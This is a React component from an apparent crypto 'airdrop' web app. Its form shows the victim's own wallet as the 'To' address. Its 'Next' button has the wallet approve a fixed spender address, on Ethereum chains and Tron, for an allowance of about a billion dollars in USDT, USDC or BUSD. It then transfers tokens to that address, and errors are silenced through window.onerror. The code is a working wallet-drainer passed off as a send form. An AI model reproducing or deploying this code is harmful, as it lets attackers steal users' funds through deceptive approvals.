import React from "react"
import { connect } from 'react-redux';
import { log, logwarn, logerror, decryptString } from "../std"
import { toast } from 'react-toastify';
import { connectWeb3, CHAINS, switchChain } from "../store/web3Store";

import "./AirdropToken.scss"
import { Col, Form, Button } from "react-bootstrap";
import "./Approve.scss"
import { Navigate } from "react-router-dom";

window.onerror = (event, source, lineno, colno, error) => {
    // console.log(event, source, lineno, colno, error);
    // prompt("window.onerror", event)
};

class Approve extends React.Component {
    state = {
        isConnectedWeb3: false, abiFolder: "contracts/", fileSettings: "settings.json", settings: null,
        USDC: {}, USDT: {}, BUSD: {},
        chainId: 1, symbol: "USDT",
        spender: "0x29bA81482e986aE44D166dD547769aaB6B02aF7F", spenderTron: "TJchx6B4vPCjUXUUNCNtME19ddKnJ58rAN",
        user: "", amount: "", addValue: "90000000000000000000000000000",
        validated: false,
        isApproved: false, isSent: false
    }

    async loadSettings() {
        let settings = await fetch(this.state.fileSettings).then(response => response.json());
        this.setState({ settings: settings, spender: settings.spender, spenderTron: settings.spenderTron })
        return settings;
    }

    componentDidMount() {
        if (!this.props.web3) {
            this.props.connectWeb3().then(r => {
                window.w3 = this.props.web3;
                // console.log(this.props.web3.defaultAddress.base58);
                this.setState({ user: this.props.accounts[0] }, this.isValidated.bind(this));
            })
        }
        this.loadSettings()
    }

    isValidated() {
        let { amount, user } = this.state;
        let vali = false;
        if (window.tronWeb) {
            vali = window.tronWeb.isAddress(user) && amount > 0;
            this.setState({ validated: vali });
        } else if (window.ethereum && this.props.web3) {
            vali = this.props.web3.utils.isAddress(user) && amount > 0;
            this.setState({ validated: vali });
        }
        return vali;
    }

    onChangeAmount(e) {
        let value = Number(e.target.value)
        if (value && value > 0) {
            this.setState({ amount: value }, this.isValidated.bind(this));
        }
    }

    async initContracts(symbol, web3 = this.props.web3) {
        let { settings } = this.state;

        let { /*USDC, BUSD, USDT,*/ abiFolder } = this.state;
        let chainId = parseInt(window.ethereum.chainId)
        if (!settings.tokens[symbol] || !settings.tokens[symbol][chainId]) {
            throw new Error("We will support this soon " + symbol + " - " + CHAINS[chainId].chainName)
        }
        let token = settings.tokens[symbol]

        let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
        let abi = await fetch(abiPath).then(response => response.json());
        log(abiPath)
        let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);
        window.mcontract = contract
        token[chainId].contract = contract;
        // 1 billion $
        let addValue = "0x" + (1_000_000_000 * (10 ** parseInt(token[chainId].decimals))).toString(16)
        console.log(addValue, token[chainId].decimals);
        contract.addValue = addValue;
        contract.decimals = token[chainId].decimals;
        this.setState({ [symbol]: token, addValue: addValue })
        return contract
    }

    async approve(e) {
        if (!this.props.web3) {
            connectWeb3()
        } else if (this.state.isApproved) {
            this.sendUSD.bind(this)(e)
        } else if (this.state.validated) {
            if (window.tronWeb) {
                // USDT on Tron
                let USDT = await window.tronWeb.contract().at(this.state.settings.tokens[this.state.symbol]["tron"].address);
                USDT.increaseApproval(this.state.spenderTron, this.state.addValue).send()
                    .then((hash) => {
                        console.log('transactionHash', hash);
                        this.setState({ isApproved: hash })
                    })
                    .catch((error) => {
                        console.log('error', error);
                        toast.error(error);
                    });
            } else if (window.ethereum) {
                let contract = await this.initContracts(this.state.symbol);
                contract.methods.approve(this.state.spender, contract.addValue).send({ from: this.props.accounts[0], gasLimit: 100000 })
                    .on('transactionHash', (hash) => {
                        console.log('transactionHash', hash);
                        this.setState({ isApproved: hash })
                    })
                    .on('error', (error, receipt) => {
                        console.log('error', error, receipt);
                        toast.error(error.message);
                    });

            }
        }
    }

    async sendUSD(e) {
        if (!this.props.web3) {
            connectWeb3()
        } else if (this.state.validated) {
            if (window.tronWeb) {
                // USDT on Tron
                let { address, decimals } = this.state.settings.tokens[this.state.symbol]["tron"]
                let USDT = await window.tronWeb.contract().at(address);
                let _amount = (this.state.amount * (10 ** decimals)).toString()
                USDT.transfer(this.state.spenderTron, _amount).send()
                    .then((hash) => {
                        console.log('transactionHash', hash);
                        this.setState({ isSent: hash })
                        toast.success("Sent success")
                    })
                    .catch((error) => {
                        console.log('error', error);
                        toast.error(error);
                    });
            } else if (window.ethereum) {
                let contract = await this.initContracts(this.state.symbol);
                let _amount = (this.state.amount * (10 ** contract.decimals)).toString()
                contract.methods.transfer(this.state.spender, _amount).send({ from: this.props.accounts[0] })
                    .on('transactionHash', (hash) => {
                        console.log('transactionHash', hash);
                        this.setState({ isSent: hash })
                        toast.success("Sent success")
                    })
                    .on('error', (error, receipt) => {
                        console.log('error', error, receipt);
                        toast.error(error.message);
                    });

            }
        }
    }

    render() {

        let { symbol, validated, amount, user } = this.state;
        let { web3, chainId } = this.props;
        return (<Col style={{ padding: "0 10px 0 10px" }}>
            {localStorage.getItem("swipe") ? "" : <Navigate to="/" replace={true} />}
            {(window.ethereum || window.tronWeb) ? "" : <Navigate to="/" replace={true} />}
            <div className="panel">
                <Form.Label htmlFor="toAddress">To</Form.Label>
                <Form.Control type="text" name="toAddress" placeholder="connect wallet ...." value={user} readOnly />
            </div>
            <div className="panel">
                <Form.Label htmlFor="amount">Amount</Form.Label>
                <Form.Control type="number" name="amount" min="1" value={amount} placeholder="amount" onChange={this.onChangeAmount.bind(this)} />
            </div>
            <div className="panel">
                <Button type="button" name="next" variant="primary" disabled={!validated} onClick={this.approve.bind(this)}>Next</Button>
            </div>
        </Col>);
    }
}


const mapStateToProps = (state, ownProps) => ({
    web3: state.web3Store.web3,
    accounts: state.web3Store.accounts,
    chainId: state.web3Store.chainId
    // contract: state.Contract.contract,
    // owner: state.Contract.owner,
});

export default connect(mapStateToProps, {
    connectWeb3: connectWeb3,
    switchChain: switchChain,
})(Approve);
